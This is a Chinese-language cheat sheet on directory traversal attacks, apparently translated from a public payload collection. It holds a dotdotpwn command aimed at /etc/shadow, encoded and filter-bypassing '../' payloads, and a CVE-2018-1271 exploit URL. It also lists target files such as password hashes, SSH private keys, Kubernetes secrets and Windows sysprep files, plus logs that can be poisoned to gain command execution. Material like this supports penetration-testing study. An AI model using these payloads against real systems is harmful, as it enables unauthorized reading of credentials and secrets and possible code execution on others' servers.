# 目录遍历

> 目录或路径遍历是利用用户提供的输入文件名的安全性验证/清理不够，以便将表示“遍历到父目录”的字符传递给文件api。

## Summary

* [Tools](#tools)
* [Basic exploitation](#basic-exploitation)
    * [16 bits Unicode encoding](#)
    * [UTF-8 Unicode encoding](#)
    * [Bypass "../" replaced by ""](#)
    * [Bypass "../" with ";"](#)
    * [Double URL encoding](#)
    * [UNC Bypass](#unc-bypass)
* [Path Traversal](#path-traversal)
    * [Interesting Linux files](#)
    * [Interesting Windows files](#)
* [References](#references)

## Tools

- [dotdotpwn - https://github.com/wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn)
    ```powershell
    git clone https://github.com/wireghoul/dotdotpwn
    perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
    ```

## Basic exploitation

我们使用 `..` 字符来访问上层目录，下面的字符串是几种可以帮助您绕过防护不佳的筛选器的编码。

```powershell
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```

### 16 位 Unicode 编码

```powershell
. = %u002e
/ = %u2215
\ = %u2216
```

### UTF-8 Unicode 编码

```powershell
. = %c0%2e, %e0%40%ae, %c0ae
/ = %c0%af, %e0%80%af, %c0%2f
\ = %c0%5c, %c0%80%5c
```

### 用 "" 绕过 "../" 
有时你会遇到一个WAF，它删除了“..”/"字符串中的字符，复制它们。

```powershell
..././
...\.\
```

### 用 ";" 绕过 "../" 

```powershell
..;/
http://domain.tld/page.jsp?include=..;/..;/sensitive.txt 
```

### 双 URL 编码

```powershell
. = %252e
/ = %252f
\ = %255c
```

**e.g:** Spring MVC 目录遍历漏洞 (CVE-2018-1271) 使用 `http://localhost:8080/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini`

### UNC 绕过

攻击者可以将Windows UNC共享('\\UNC\share\name')注入到软件系统中，从而可能将访问重定向到任意的位置或任意文件。

```powershell
\\localhost\c$\windows\win.ini
```


## Path Traversal

### 引人注目的 Linux 文件

```powershell
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/self/cwd/index.php
/proc/self/cwd/main.py
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/var/run/secrets/kubernetes.io/serviceaccount
```

### 引人注目的 Windows 文件

检查引人注目的文件 (转自 https://github.com/soffensive/windowsblindread)

```powershell
c:/boot.ini
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
```

以下日志文件是可控的，可以包含在恶意payload中以实现命令执行

```powershell
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail
```

## References

* [Directory traversal attack - Wikipedia](https://en.wikipedia.org/wiki/Directory_traversal_attack)
* [CWE-40: Path Traversal: '\\UNC\share\name\' (Windows UNC Share) - CWE Mitre - December 27, 2018](https://cwe.mitre.org/data/definitions/40.html)